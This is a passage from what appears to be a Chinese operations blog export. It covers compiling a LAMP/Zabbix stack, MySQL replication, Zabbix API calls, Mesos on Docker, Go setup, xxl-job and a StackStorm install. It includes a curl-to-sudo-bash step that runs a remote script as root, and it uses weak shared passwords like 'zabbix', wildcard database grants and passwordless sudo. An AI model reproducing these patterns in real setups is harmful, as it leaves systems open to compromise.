http://jaist.dl.sourceforge.net/project/mcrypt/Libmcrypt/2.5.8/libmcrypt-2.5.8.tar.gzsudo tar zxvf libmcrypt-2.5.8.tar.gzcd libmcrypt-2.5.8/sudo ./configure --prefix=/opt/libmcryptsudo makesudo make install 安装freetype1234567cd /optsudo wget http://ftp.yzu.edu.tw/nongnu//freetype/freetype-2.6.tar.gzsudo tar zxvf freetype-2.6.tar.gz cd freetype-2.6/sudo ./configure --prefix=/opt/freetypesudo makesudo make install 安装jpegsrc（zabbix需要）1234567cd /optsudo wget http://www.ijg.org/files/jpegsrc.v9b.tar.gz sudo tar zxvf jpegsrc.v9b.tar.gzcd jpeg-9b/sudo ./configure --prefix=/opt/jpegsudo makesudo make install 编译安装php123456789cd /optsudo wget http://ar2.php.net/distributions/php-5.6.23.tar.gzsudo tar zxvf php-5.6.23.tar.gz cd php-5.6.23/sudo ./configure --prefix=/opt/php --with-config-file-path=/opt/php/etc --enable-fpm --with-mcrypt=/opt/libmcrypt --with-zlib=/opt/zlib --with-openssl --with-mysql --with-mysql-sock --with-gd --enable-xml --with-bz2=/usr/local/lib --enable-zip --with-freetype-dir=/opt/freetype --with-mysqli --enable-mysqlnd --with-curl --enable-mbstring --enable-bcmath --enable-sockets --with-jpeg-dir=/opt/jpeg --with-gd --with-gettextsudo makesudo make installcd /optsudo chown -R www.www php 整合nginx + php创建php、php-fpm配置文件12345678910sudo cp /opt/php-5.6.23/php.ini-production /opt/php/etc/php.inisudo vim /opt/php/etc/php.ini 修改如下行 date.timezone = Asia/Shanghaisudo cp /opt/php/etc/php-fpm.conf.default /opt/php/etc/php-fpm.confsudo vim /opt/php/etc/php-fpm.conf修改如下行user = wwwgroup = wwwpid = run/php-fpm.pid 创建php-fpm启动脚本、启动php-fpm1234567891011121314151617181920212223242526272829303132333435363738sudo vim /etc/init.d/php-fpm贴入如下内容#!/bin/sh ### BEGIN INIT INFO # Provides: nginx # Required-Start: # Required-Stop: # Default-Start: 2 3 4 5 # Default-Stop: 0 1 6 # Short-Description: nginx # Description: nginx server ### END INIT INFO . /lib/lsb/init-functionsPROGRAM=/opt/php/sbin/php-fpmtest -x $PROGRAM || exit 0case "$1" in start) log_begin_msg "Starting php-fpm server" /opt/php/sbin/php-fpm -y /opt/php/etc/php-fpm.conf -c /opt/php/etc/php.ini log_end_msg 0 ;; stop) PID=`cat /opt/php/var/run/php-fpm.pid` log_begin_msg "Stopping php-fpm server" if [ ! -z "$PID" ]; then kill -15 $PID fi log_end_msg 0 ;; restart) $0 stop $0 start ;; *) log_success_msg "Usage: service php-fpm &#123;start|stop|restart&#125;" exit 1esacexit 0 123sudo chmod +x /etc/init.d/php-fpmsudo /etc/init.d/php-fpm startsudo update-rc.d php-fpm defaults 修改nginx配置文件，创建index.php，测试整合成功1234567891011121314151617sudo vim /opt/nginx/conf/nginx.conf修改如下内容user www;pid logs/nginx.pid;#默认首页index.phplocation / &#123; root html; index index.html index.htm index.php; &#125;#php文件交给fastcgi处理location ~ \.php$ &#123; # root html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; &#125; 创建测试页面index.php1234sudo vim /opt/nginx/html/index.php&lt;?phpphpinfo();?&gt; 重启nginx1sudo /etc/init.d/nginx restart 验证是否整合成功，地址栏：ip/index.php,如出现下图，整合成功。 编译安装mysql安装依赖包1234sudo apt-get -y install g++ cmake ncurses-devcd /optsudo wget http://heanet.dl.sourceforge.net/project/boost/boost/1.59.0/boost_1_59_0.tar.gzsudo tar zxvf boost_1_59_0.tar.gz 创建用户和用户组123456#创建mysql用户及用户组，创建mysql-data目录sudo groupadd mysqlsudo useradd mysql -s /sbin/nologin -g mysqlsudo mkdir -p /data/postmall/mysql/datacd /data/postmall/sudo chown -R mysql.mysql mysql 编译安装mysql12345678sudo wget http://cdn.mysql.com//Downloads/MySQL-5.7/mysql-5.7.13.tar.gzsudo tar zxvf mysql-5.7.13.tar.gz cd mysql-5.7.13/sudo cmake -DCMAKE_INSTALL_PREFIX=/opt/mysql -DMYSQL_DATADIR=/data/postmall/mysql/data -DDEFAULT_CHARSET=utf8 -DDEFAULT_COLLATION=utf8_general_ci -DENABLED_LOCAL_INFILE=1 -DDOWNLOAD_BOOST=1 -DWITH_BOOST=/opt/boost_1_59_0sudo makesudo make installcd /optchown -R mysql.mysql mysql 初始化mysql123456789cd /opt/mysql/binsudo ./mysqld --initialize --user=mysql --datadir=/data/postmall/mysql/data --basedir=/opt/mysql --socket=/var/mysql.sock#创建mysql配置文件和启动脚本sudo cp support-files/my-default.cnf /etc/my.cnfsudo cp support-files/mysql.server /etc/init.d/mysqldsudo chmod +x /etc/init.d/mysqld#将mysql加入系统搜索路径（环境变量）cd /opt/mysql/binsudo cp mysql /usr/bin/ 启动并登陆mysql1sudo /etc/init.d/mysqld start mysql主备配置: 修改主服务器master: 12345#vi my.cnf[mysqld]log-bin=mysql-bin server-id=1 #bind-address = 127.0.0.1 修改从服务器slave: 1234#vi /etc/my.cnf[mysqld]log-bin=mysql-bin server-id=2 在主服务器上建立帐户并授权slave: 1mysql&gt;GRANT REPLICATION SLAVE ON *.* to 'zabbix'@'%' identified by 'zabbix'; 登录主服务器的mysql，查询master的状态 12345678mysql&gt;show master status; +------------------+----------+--------------+------------------+ | File | Position | Binlog_Do_DB | Binlog_Ignore_DB | +------------------+----------+--------------+------------------+ | mysql-bin.000004 | 308 | | | +------------------+----------+--------------+------------------+ 1 row in set (0.00 sec) 注：执行完此步骤后不要再操作主服务器MYSQL，防止主服务器状态值变化 配置从服务器Slave： 1234mysql&gt;change master to master_host='172.25.200.55',master_user='zabbix',master_password='zabbix', master_log_file='mysql-bin.000004',master_log_pos=308; //注意不要断开，308数字前后无单引号。Mysql&gt;start slave; 检查从服务器复制功能状态： 123456789101112131415161718192021mysql&gt; show slave status\G *************************** 1. row *************************** Slave_IO_State: Waiting for master to send event Master_Host: 172.25.200.55 //主服务器地址 Master_User: mysync //授权帐户名，尽量避免使用root Master_Port: 3306 //数据库端口，部分版本没有此行 Connect_Retry: 60 Master_Log_File: mysql-bin.000004 Read_Master_Log_Pos: 600 //#同步读取二进制日志的位置，大于等于Exec_Master_Log_Pos Relay_Log_File: ddte-relay-bin.000003 Relay_Log_Pos: 251 Relay_Master_Log_File: mysql-bin.000004 Slave_IO_Running: Yes //此状态必须YES Slave_SQL_Running: Yes //此状态必须YES ......注：Slave_IO及Slave_SQL进程必须正常运行，即YES状态，否则都是错误的状态(如：其中一个NO均属错误)。以上操作过程，主从服务器配置完成。 编译安装zabbix123456789101112131415wget http://jaist.dl.sourceforge.net/project/zabbix/ZABBIX%20Latest%20Stable/3.0.3/zabbix-3.0.3.tar.gztar -zxvf zabbix-3.0.3.tar.gzcd zabbix-3.0.3/mkdir -p /opt/zabbix[ 各种库文件安装 ]方法：sudo apt-get install make libmysqld-dev libmysqlclient-dev libxml2-dev snmp snmpd libsnmp-dev libcurl4-openssl-dev openjdk-6-jdk[ 编译 ]./configure --prefix=/opt/zabbix --enable-java --enable-server --enable-agent --with-mysql --enable-ipv6 --with-net-snmp --with-libcurl --with-libxml2[ 安装]make &amp;&amp; make install 配置zabbix创建zabbix数据库，并导入zabbix数据库文件 12345678910111213141516#创建数据库mysql -u root -pcreate database zabbix character set utf8;grant all on zabbix.* to 'zabbix'@'172.25.200.54' identified by 'zabbix';grant all on zabbix.* to 'zabbix'@'172.25.200.56' identified by 'zabbix';grant all on zabbix.* to 'zabbix'@'localhost' identified by 'zabbix';flush privileges;exit;#导入数据库文件cd /optsudo wget http://repo.zabbix.com/zabbix/3.0/ubuntu/pool/main/z/zabbix/zabbix_3.0.3.orig.tar.gz sudo tar zxvf zabbix_3.0.3.orig.tar.gzcd zabbix-3.0.3/database/mysqlmysql -uzabbix -pzabbix zabbix &lt; schema.sqlmysql -uzabbix -pzabbix zabbix &lt; images.sqlmysql -uzabbix -pzabbix zabbix &lt; data.sql 配置zabbix_server.conf123456vim /opt/zabbix/etc/zabbix_server.confLogFile=/var/log/zabbix/zabbix_server.log #如没有/var/log/zabbix目录，请创建DBHost=172.25.200.55DBName=zabbixDBUser=zabbixDBPassword=zabbix 配置php.ini1234sudo vim /opt/php/etc/php.inipost_max_size = 16Mmax_execution_time = 300max_input_time = 300 配置zabbix页面1234567891011cd /opt/zabbix-3.0.3/frontends/php/sudo cp -a . /data/zabbix/cd /data/sudo chown -R www.www zabbix mv /zabbix/conf/zabbix.conf.php.example /zabbix/conf/zabbix.conf.phpsudo vim /var/www/html/zabbix/conf/zabbix.conf.php修改项$DB['DATABASE'] = 'zabbix';$DB['USER'] = 'zabbix';$DB['PASSWORD'] = 'zabbix' 配置nginx.conf123456789101112sudo vim /opt/nginx/conf/nginx.conf location / &#123; root /data/postmall; index index.html index.htm index.php; &#125; location ~ \.php$ &#123; root /data/postmall; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; &#125; 重启zabbix、php-fpm 、nginx123sudo /etc/init.d/zabbix_server restartsudo /etc/init.d/php-fpm restartsudo /etc/init.d/nginx restart 安装grafana123456$ wget https://grafanarel.s3.amazonaws.com/builds/grafana_3.1.0-1468321182_amd64.deb$ sudo apt-get install -y adduser libfontconfig$ sudo dpkg -i grafana_3.1.0-1468321182_amd64.debgrafana-cli plugins list-remotegrafana-cli plugins install alexanderzobnin-zabbix-appservice grafana-server restart 安装zatree12345git clone https://github.com/BillWang139967/zatree.gitcd zatree/zabbix-3.0.x/bash start.sh执行过程中需要输入zabbix admin的账号和密码调整php页面文件（header.php，echart.php，peckvalue.php，zabbix_zatree.php）详情请参考wiki上《Zatree for zabbix 3.0.x》及其附件。]]></content>
      <categories>
        <category>应用运维</category>
        <category>服务搭建</category>
      </categories>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zabbix api调用步骤]]></title>
    <url>%2Farticles%2F4c04639e.html</url>
    <content type="text"><![CDATA[目的明确调用zabbix api的步骤，便于利用zabbix进行二次开发。 步骤简单来说，zabbix api调用分4步：获取userid–&gt;获取hostid–&gt;获取itemid–&gt;根据时间节点获取数据，流程如下: 操作获取userid:1curl -i -X POST -H 'Content-Type: application/json' -d '&#123;"jsonrpc":"2.0","method":"user.login","params":&#123;"user":"xxxx","password":"xxxx"&#125;,"auth":null,"id":0&#125;' http://x.x.x.x/api_jsonrpc.php 获取hostid:1curl -i -X POST -H 'Content-Type: application/json' -d '&#123;"jsonrpc": "2.0","method":"host.get","params":&#123;"output":["hostid"],"filter": &#123;"host":"192.168.211.60"&#125;&#125;,"auth": "a826fca79a0795ccc1224dc76329972f","id": 0&#125;' http://x.x.x.x/api_jsonrpc.php 获取itemid:1curl -i -X POST -H 'Content-Type: application/json' -d '&#123;"jsonrpc": "2.0","method":"item.get","params":&#123;"output":"itemids","hostids":"10243","search":&#123;"key_":"system.cpu.util[,idle,avg1]"&#125;&#125;,"auth": "a826fca79a0795ccc1224dc76329972f","id": 0&#125;' http://x.x.x.x/api_jsonrpc.php 获取数据：1curl -i -X POST -H 'Content-Type: application/json' -d '&#123;"jsonrpc": "2.0","method":"history.get","params":&#123;"history":0,"itemids":["24526"],"time_from":"1392789600","time_till":"1392790200","output":"extend"&#125;,"auth": "a826fca79a0795ccc1224dc76329972f","id": 0&#125;' http://x.x.x.x/api_jsonrpc.php c]]></content>
      <categories>
        <category>应用运维</category>
        <category>监控积累</category>
      </categories>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mesos集群搭建(host)]]></title>
    <url>%2Farticles%2F1c48fe84.html</url>
    <content type="text"><![CDATA[目的通过本文构建mesos集群，用mesos+marathon把docker玩起来。 架构图 环境系统： Centos7.x + Docker环境 服务器：10.10.0.1，10.10.0.2，10.10.0.3 搭建配置hosts解析:1234#Mesos10.10.0.1 mesos-node-110.10.0.2 mesos-node-210.10.0.3 mesos-node-3 zookeeper集群123456# 根据节点修改MYID,namedocker run -d \-e MYID=1 \-e SERVERS=mesos-node-1,mesos-node-2,mesos-node-3 \--name mesos-zookeeper1 --net=host --restart=on-failure:5 mesoscloud/zookeeper:3.4.8-centos-7 mesos-master集群12345678910#根据节点修改ip.address, namedocker run -d \-e MESOS_HOSTNAME=ip.address \-e MESOS_IP=ip.address \-e MESOS_QUORUM=1 \-e MESOS_LOG_DIR=/var/log/mesos \-e MESOS_WORK_DIR=/var/tmp/mesos \-e MESOS_ZK=zk://mesos-node-1:2181,mesos-node-2:2181,mesos-node-3:2181/mesos \--name mesos-master1 --net host --restart=on-failure:5 mesosphere/mesos-master:1.4.1 marathon集群123456789# 根据节点修改ip.addresss, namedocker run -d \-e MARATHON_HOSTNAME=ip.address \-e MARATHON_HTTPS_ADDRESS=ip.address \-e MARATHON_HTTP_ADDRESS=ip.address \-e MARATHON_MASTER=zk://mesos-node-1:2181,mesos-node-2:2181,mesos-node-3:2181/mesos \-e MARATHON_ZK=zk://mesos-node-1:2181,mesos-node-2:2181,mesos-node-3:2181/marathon \--name mesos-marathon1 --net host --restart=on-failure:5 mesosphere/marathon:v1.5.2 mesos-slave集群1234567891011121314151617181920212223# 根据节点修改ip.address, namedocker run -d \-v /usr/bin/docker:/usr/bin/docker \-v /var/run/docker.sock:/var/run/docker.sock \-v /sys/fs/cgroup:/sys/fs/cgroup \-e MESOS_PORT=5051 \-e MESOS_HOSTNAME=ip.address \-e MESOS_IP=ip.address \-e MESOS_MASTER=zk://mesos-node-1:2181,mesos-node-2:2181,mesos-node-3:2181/mesos \-e MESOS_CONTAINERIZERS=mesos,docker \-e MESOS_SWITCH_USER=0 \-e MESOS_LOG_DIR=/var/log/mesos \-e MESOS_WORK_DIR=/var/tmp/mesos \-e MESOS_ADVERTISE_IP=ip.address \-e MESOS_ADVERTISE_PORT=5051 \-e MESOS_LAUNCHER="posix" \-e MESOS_SYSTEMD_ENABLE_SUPPORT=false \-e GLOG_v=1 --name mesos-slave1 --privileged --net host \--restart=on-failure:5 \mesosphere/mesos-slave:1.4.1#如果需要限定slave提供的资源，请添加resource参数: -e MESOS_RESOURCES="cpus:1;mem:300;" marathon-lb1234docker run -d --privileged --name mesos-marathon-lb1 -e PORTS=9090 \--net=host --restart=on-failure:5 mesosphere/marathon-lb \sse -m http://master1_ip:8080 -m http://master2_ip:8080 -m http://master3_ip:8080 \--group external]]></content>
      <categories>
        <category>应用运维</category>
        <category>服务搭建</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Mesos</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux修改时区正确姿势]]></title>
    <url>%2Farticles%2F4655e3fe.html</url>
    <content type="text"><![CDATA[背景CentOS和Ubuntu的时区文件是/etc/localtime，但是在CentOS7以后localtime以及变成了一个链接文件，那要怎么正确修改时区呢？ 12[root@centos7 ~]# ll /etc/localtime lrwxrwxrwx 1 root root 33 Oct 12 11:01 /etc/localtime -&gt; /usr/share/zoneinfo/Asia/Shanghai 传统方法如果采用直接cp的方法修改系统时区，那么就会把它所链接的文件修改掉，例如把美国的时区文件内容修改成了上海的时区内容，有可能会导致有些编程语言或程序在读取系统时区的时候发生错误。 正确方法CentOS6、Ubuntu161cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime CentOS7、RHEL7、Scientific Linux 7、Oracle Linux 7最好的方法是使用timedatectl命令 1234timedatectl list-timezones |grep Shanghai #查找中国时区的完整名称Asia/Shanghaitimedatectl set-timezone Asia/Shanghai #其他时区以此类推 或者直接手动创建软链接 1ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime]]></content>
      <categories>
        <category>系统运维</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安装Go环境]]></title>
    <url>%2Farticles%2Fb4e133aa.html</url>
    <content type="text"><![CDATA[目的通过本文构建Go语言环境，便于以后开发go项目需求。 搭建下载打开官网下载地址选择对应的系统版本, 这里我选择的是最新稳定版：go1.12.linux-amd64.tar.gz 进入你用来存放安装包的目录, 然后执行命令拉取包 1wget https://dl.google.com/go/go1.12.linux-amd64.tar.gz 配置执行tar解压到/usr/loacl目录下，得到go文件夹 1tar -C /usr/local -zxvf go1.12.linux-amd64.tar.gz 添加/usr/loacl/go/bin目录到PATH变量中。添加到/etc/profile 或$HOME/.profile都可以 12345678// 习惯用vim，没有的话可以用命令`sudo apt-get install vim`安装一个vim /etc/profile// 在最后一行添加export GOROOT=/usr/local/go #设置为go安装的路径export GOPATH=$HOME/gocode #默认安装包的路径export PATH=$PATH:$GOROOT/bin:$GOPATH/bin// wq保存退出后source一下source /etc/profile 验证1go version 如果现实版本号，则Go环境安装成功。是不是很简单呢？ 12345678910111213141516171819202122232425#获取go环境参数go env===============================GOARCH="amd64"GOBIN=""GOEXE=""GOHOSTARCH="amd64"GOHOSTOS="linux"GOOS="linux"GOPATH="/root/gocode"GORACE=""GOROOT="/usr/local/go"GOTOOLDIR="/usr/local/go/pkg/tool/linux_amd64"GCCGO="gccgo"CC="gcc"GOGCCFLAGS="-fPIC -m64 -pthread -fmessage-length=0 -fdebug-prefix-map=/tmp/go-build057487015=/tmp/go-build -gno-record-gcc-switches"CXX="g++"CGO_ENABLED="1"CGO_CFLAGS="-g -O2"CGO_CPPFLAGS=""CGO_CXXFLAGS="-g -O2"CGO_FFLAGS="-g -O2"CGO_LDFLAGS="-g -O2"PKG_CONFIG="pkg-config" 可以开始你的go开发之旅，不要犹豫，Good Luck !]]></content>
      <categories>
        <category>应用运维</category>
        <category>服务搭建</category>
      </categories>
      <tags>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于Docker的高可用集群xxl-job分布式任务调度]]></title>
    <url>%2Farticles%2F34f69489.html</url>
    <content type="text"><![CDATA[目的XXL-JOB是一个轻量级分布式任务调度平台，其核心设计目标是开发迅速、学习简单、轻量级、易扩展。现已开放源代码并接入多家公司线上产品线，开箱即用。本文是基于docker从编译到高可用集群方案的制定和部署实施，做了详细阐述。 参考中文文档 特性 1、简单：支持通过Web页面对任务进行CRUD操作，操作简单，一分钟上手； 2、动态：支持动态修改任务状态、启动/停止任务，以及终止运行中任务，即时生效； 3、调度中心HA（中心式）：调度采用中心式设计，“调度中心”自研调度组件并支持集群部署，可保证调度中心HA； 4、执行器HA（分布式）：任务分布式执行，任务”执行器”支持集群部署，可保证任务执行HA； 5、注册中心: 执行器会周期性自动注册任务, 调度中心将会自动发现注册的任务并触发执行。同时，也支持手动录入执行器地址； 6、弹性扩容缩容：一旦有新执行器机器上线或者下线，下次调度时将会重新分配任务； 7、路由策略：执行器集群部署时提供丰富的路由策略，包括：第一个、最后一个、轮询、随机、一致性HASH、最不经常使用、最近最久未使用、故障转移、忙碌转移等； 8、故障转移：任务路由策略选择”故障转移”情况下，如果执行器集群中某一台机器故障，将会自动Failover切换到一台正常的执行器发送调度请求。 9、阻塞处理策略：调度过于密集执行器来不及处理时的处理策略，策略包括：单机串行（默认）、丢弃后续调度、覆盖之前调度； 10、任务超时控制：支持自定义任务超时时间，任务运行超时将会主动中断任务； 11、任务失败重试：支持自定义任务失败重试次数，当任务失败时将会按照预设的失败重试次数主动进行重试；其中分片任务支持分片粒度的失败重试； 12、任务失败告警；默认提供邮件方式失败告警，同时预留扩展接口，可方便的扩展短信、钉钉等告警方式； 13、分片广播任务：执行器集群部署时，任务路由策略选择”分片广播”情况下，一次任务调度将会广播触发集群中所有执行器执行一次任务，可根据分片参数开发分片任务； 14、动态分片：分片广播任务以执行器为维度进行分片，支持动态扩容执行器集群从而动态增加分片数量，协同进行业务处理；在进行大数据量业务操作时可显著提升任务处理能力和速度。 15、事件触发：除了”Cron方式”和”任务依赖方式”触发任务执行之外，支持基于事件的触发任务方式。调度中心提供触发任务单次执行的API服务，可根据业务事件灵活触发。 16、任务进度监控：支持实时监控任务进度； 17、Rolling实时日志：支持在线查看调度结果，并且支持以Rolling方式实时查看执行器输出的完整的执行日志； 18、GLUE：提供Web IDE，支持在线开发任务逻辑代码，动态发布，实时编译生效，省略部署上线的过程。支持30个版本的历史版本回溯。 19、脚本任务：支持以GLUE模式开发和运行脚本任务，包括Shell、Python、NodeJS、PHP、PowerShell等类型脚本; 20、命令行任务：原生提供通用命令行任务Handler（Bean任务，”CommandJobHandler”）；业务方只需要提供命令行即可； 21、任务依赖：支持配置子任务依赖，当父任务执行结束且执行成功后将会主动触发一次子任务的执行, 多个子任务用逗号分隔； 22、一致性：“调度中心”通过DB锁保证集群分布式调度的一致性, 一次任务调度只会触发一次执行； 23、自定义任务参数：支持在线配置调度任务入参，即时生效； 24、调度线程池：调度系统多线程触发调度运行，确保调度精确执行，不被堵塞； 25、数据加密：调度中心和执行器之间的通讯进行数据加密，提升调度信息安全性； 26、邮件报警：任务失败时支持邮件报警，支持配置多邮件地址群发报警邮件； 27、推送maven中央仓库: 将会把最新稳定版推送到maven中央仓库, 方便用户接入和使用; 28、运行报表：支持实时查看运行数据，如任务数量、调度次数、执行器数量等；以及调度报表，如调度日期分布图，调度成功分布图等； 29、全异步：任务调度流程全异步化设计实现，如异步调度、异步运行、异步回调等，有效对密集调度进行流量削峰，理论上支持任意时长任务的运行； 30、跨平台：原生提供通用HTTP任务Handler（Bean任务，”HttpJobHandler”）；业务方只需要提供HTTP链接即可，不限制语言、平台； 31、国际化：调度中心支持国际化设置，提供中文、英文两种可选语言，默认为中文； 32、容器化：提供官方docker镜像，并实时更新推送dockerhub，进一步实现产品开箱即用； 33、线程池隔离：调度线程池进行隔离拆分，慢任务自动降级进入”Slow”线程池，避免耗尽调度线程，提高系统稳定性；； 34、用户管理：支持在线管理系统用户，存在管理员、普通用户两种角色； 35、权限控制：执行器维度进行权限控制，管理员拥有全量权限，普通用户需要分配执行器权限后才允许相关操作； 高可用集群方案思路XXL-Job如何实现集群？底层已经实现好了！如果感兴趣可以详读中文文档。 如果想实现Job集群，需要考虑几点问题： 数据库配置一致性 任务列表一致性 登录账号一致性 集群机器时钟保持一致性（单机集群忽略） 建议：推荐通过Nginx为调度中心集群做负载均衡，分配域名。调度中心访问、执行器回收配置、调用API服务等操作均通过该域名进行。 架构图 架构图设计想法： 1，配置Nginx负载均衡，负责分发请求。 2，连接相同的数据库，保持数据库中的数据一致性，就避免了产生Job的重复执行问题。 编译过程安装Maven导入Maven镜像源在shell中运行以下命令，导入Maven镜像源： 1wget http://repos.fedorapeople.org/repos/dchen/apache-maven/epel-apache-maven.repo -O /etc/yum.repos.d/epel-apache-maven.repo 安装Maven在shell中运行以下命令，安装Maven： 1yum install -y apache-maven 编译xxl-job源码安装Git客户端在shell中运行以下命令，安装Git客户端： 1yum install -y git 克隆代码库在shell中运行以下命令，克隆代码库至本地目录： 1git clone https://github.com/xuxueli/xxl-job.git 修改应用配置在shell中运行以下命令，修改应用配置，包括数据库密码、通知邮件账号和密码： 1vim ./xxl-job/xxl-job-admin/src/main/resources/application.properties 请根据实际情况，设置真实的数据库的账号和密码，以及通知邮件的账号和密码。 编译源码在shell中运行以下命令，编译xxl-job服务器的源码： 12cd ./xxl-jobmvn clean package 编译完成之后，会得到一个名为xxl-job-admin-2.1.0.jar的打包文件，可以把这个文件备份在其他地方，便于以后制作Docker镜像时使用。]]></content>
      <categories>
        <category>运维研发</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Stackstorm之一键安装]]></title>
    <url>%2Farticles%2Fc8f378bd.html</url>
    <content type="text"><![CDATA[安装StackStorm作为RPM和Debs分发用于RedHat / CentOS和Ubuntu Linux系统，以及Docker镜像。您可以使用脚本在单个系统上自动安装和配置所有组件，也可以按照操作系统的手动说明进行操作。 以下是选项概述： 一键安装：运行我们的安装脚本，在单个系统上进行所有组件的固定安装。这是我们推荐的入门方式。有关详细信息，请参阅下面的“ 快速安装 手动安装：有定制需求吗？也许您的服务器无法访问Internet？或者只是不喜欢使用脚本安装？阅读适用于您的操作系统的手册安装说明（Ubuntu 14 / 16，RHEL / CentOS 6，RHEL / CentOS 7），并根据您的需要进行调整。以下是为StackStorm repos设置内部镜像的一些其他指导。 Ansible Playbooks：如果您是Ansible用户，请查看这些Ansible Playbooks以安装StackStorm。非常适合StackStorm的可重复，一致，幂等安装。 高可用性将业务关键自动化任务委托给像StackStorm这样的系统会对该系统产生更高的要求。StackStorm可以在HA模式下运行以确保满足这些需求。 Kubernetes中的StackStorm HA集群 - BETA将整个复杂的基础架构自动化为可重现的蓝图。 参考文档官方文档 系统要求StackStorm需要Ubuntu，RHEL或CentOS Linux。并且仅支持64位架构。 这是测试和部署StackStorm的建议最小大小： 安装系统环境RHEL 7 / CentOS 7 调整SELinux策略如果您的系统在执行模式下具有SELinux，请按照这些说明调整SELinux策略。这是成功安装所必需的。如果您对这些政策不满意，可能需要根据您的安全措施进行调整 首先检查SELinux是否处于执行模式： 1getenforce 如果上一个命令返回“Enforcing”，则运行以下命令： 12345678# SELINUX management tools, not available for some minimal installationssudo yum install -y policycoreutils-python# Allow network access for nginxsudo setsebool -P httpd_can_network_connect 1# Allow RabbitMQ to use port '25672', otherwise it will fail to startsudo semanage port --list | grep -q 25672 || sudo semanage port -a -t amqp_port_t -p tcp 25672 安装依赖项提示：目前支持的MongoDB版本是3.4。这是安装程序脚本安装的版本。MongoDB 3.6及更新版目前不支持StackStorm。将在StackStorm的未来版本中添加对4.0的支持 安装MongoDB，RabbitMQ和PostgreSQL： 1234567891011121314151617181920212223242526272829303132sudo yum -y install https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm# Add key and repo for the latest stable MongoDB (3.4)sudo rpm --import https://www.mongodb.org/static/pgp/server-3.4.ascsudo sh -c "cat &lt;&lt;EOT &gt; /etc/yum.repos.d/mongodb-org-3.4.repo[mongodb-org-3.4]name=MongoDB Repositorybaseurl=https://repo.mongodb.org/yum/redhat/7/mongodb-org/3.4/x86_64/gpgcheck=1enabled=1gpgkey=https://www.mongodb.org/static/pgp/server-3.4.ascEOT"sudo yum -y install crudinisudo yum -y install mongodb-orgsudo yum -y install rabbitmq-serversudo systemctl start mongod rabbitmq-serversudo systemctl enable mongod rabbitmq-server# Install and configure postgressudo yum -y install postgresql-server postgresql-contrib postgresql-devel# Initialize PostgreSQLsudo postgresql-setup initdb# Make localhost connections to use an MD5-encrypted password for authenticationsudo sed -i "s/\(host.*all.*all.*127.0.0.1\/32.*\)ident/\1md5/" /var/lib/pgsql/data/pg_hba.confsudo sed -i "s/\(host.*all.*all.*::1\/128.*\)ident/\1md5/" /var/lib/pgsql/data/pg_hba.conf# Start PostgreSQL servicesudo systemctl start postgresqlsudo systemctl enable postgresql 设置存储库以下脚本将检测您的平台和体系结构，并设置相应的StackStorm存储库。它还将添加用于包签名的GPG密钥。 1curl -s https://packagecloud.io/install/repositories/StackStorm/stable/script.rpm.sh | sudo bash 安装StackStorm组件1sudo yum install -y st2 st2mistral 如果您没有在同一系统上运行RabbitMQ，MongoDB或PostgreSQL，或者更改了默认值，请调整以下设置： RabbitMQ连接/etc/st2/st2.conf和/etc/mistral/mistral.conf MongoDB在 /etc/st2/st2.conf PostgreSQL在 /etc/mistral/mistral.conf 设置数据存储区加密在key-value存储，允许用户存储加密的值（秘密）。这些是使用对称加密（AES256）存储的。要生成加密密钥，请运行以下命令： 12345678910111213141516DATASTORE_ENCRYPTION_KEYS_DIRECTORY="/etc/st2/keys"DATASTORE_ENCRYPTION_KEY_PATH="$&#123;DATASTORE_ENCRYPTION_KEYS_DIRECTORY&#125;/datastore_key.json"sudo mkdir -p $&#123;DATASTORE_ENCRYPTION_KEYS_DIRECTORY&#125;sudo st2-generate-symmetric-crypto-key --key-path $&#123;DATASTORE_ENCRYPTION_KEY_PATH&#125;# Make sure only st2 user can read the filesudo chgrp st2 $&#123;DATASTORE_ENCRYPTION_KEYS_DIRECTORY&#125;sudo chmod o-r $&#123;DATASTORE_ENCRYPTION_KEYS_DIRECTORY&#125;sudo chgrp st2 $&#123;DATASTORE_ENCRYPTION_KEY_PATH&#125;sudo chmod o-r $&#123;DATASTORE_ENCRYPTION_KEY_PATH&#125;# set path to the key file in the configsudo crudini --set /etc/st2/st2.conf keyvalue encryption_key_path $&#123;DATASTORE_ENCRYPTION_KEY_PATH&#125;sudo st2ctl restart-component st2api 设置Mistral数据库运行以下命令以设置Mistral PostgreSQL数据库 12345678910# Create Mistral DB in PostgreSQLcat &lt;&lt; EHD | sudo -u postgres psqlCREATE ROLE mistral WITH CREATEDB LOGIN ENCRYPTED PASSWORD 'StackStorm';CREATE DATABASE mistral OWNER mistral;EHD# Setup Mistral DB tables, etc./opt/stackstorm/mistral/bin/mistral-db-manage --config-file /etc/mistral/mistral.conf upgrade head# Register mistral actions/opt/stackstorm/mistral/bin/mistral-db-manage --config-file /etc/mistral/mistral.conf populate | grep -v -e openstack -e keystone -e ironicclient 配置SSH和SUDO要运行本地和远程shell操作，StackStorm使用特殊系统用户（默认情况下stanley）。对于远程Linux操作，使用SSH。我们建议在所有远程主机上配置基于公钥的SSH访问。我们还建议配置对localhost的SSH访问以运行示例和测试。 创建StackStorm系统用户，启用无密码sudo，并设置对“localhost”的ssh访问，以便可以在本地测试基于SSH的操作。您需要提升权限才能执行此操作： 123456789101112131415161718# Create an SSH system user (default `stanley` user may already exist)sudo useradd stanleysudo mkdir -p /home/stanley/.sshsudo chmod 0700 /home/stanley/.ssh# Generate ssh keyssudo ssh-keygen -f /home/stanley/.ssh/stanley_rsa -P ""# Authorize key-based accesssudo sh -c 'cat /home/stanley/.ssh/stanley_rsa.pub &gt;&gt; 